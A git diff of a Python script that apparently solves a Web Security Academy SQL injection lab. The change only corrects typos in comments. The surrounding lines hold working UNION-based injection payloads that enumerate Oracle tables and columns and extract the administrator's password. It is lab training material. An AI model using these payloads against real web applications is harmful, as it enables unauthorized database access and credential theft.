@@ -35,7 +35,7 @@ url = "https://0a4b0031046f722a872b2f4b00d80082.web-security-academy.net"
 
 print(Fore.BLUE + "[#] Injection parameter: " + Fore.YELLOW + "category")
 
-# payload to retreive the name of users table
+# payload to retrieve the name of users table
 payload = "' union SELECT table_name, null from all_tables-- -"
 
 try:
@@ -52,7 +52,7 @@ users_table = re.findall("<th>(USERS_.*)</th>", injection.text)[0]
 print(Fore.WHITE + "1. Injecting a payload to retrieve the name of users table.. " +
         Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + users_table)
 
-# payload to retreive the names of username and password columns
+# payload to retrieve the names of username and password columns
 payload = f"' union SELECT column_name, null from all_tab_columns where table_name = '{users_table}'-- -"
 
 try:
@@ -72,7 +72,7 @@ password_column = re.findall("<th>(PASSWORD_.*)</th>", injection.text)[0]
 print(Fore.WHITE + "2. Adjusting the payload to retrieve the names of username and password columns.. " +
         Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + username_column + " | " + password_column)
 
-# payload to retreive the password of the administrator
+# payload to retrieve the password of the administrator
 payload = f"' union SELECT {username_column}, {password_column} from {users_table} where {username_column} = 'administrator'-- -"
 
 try:
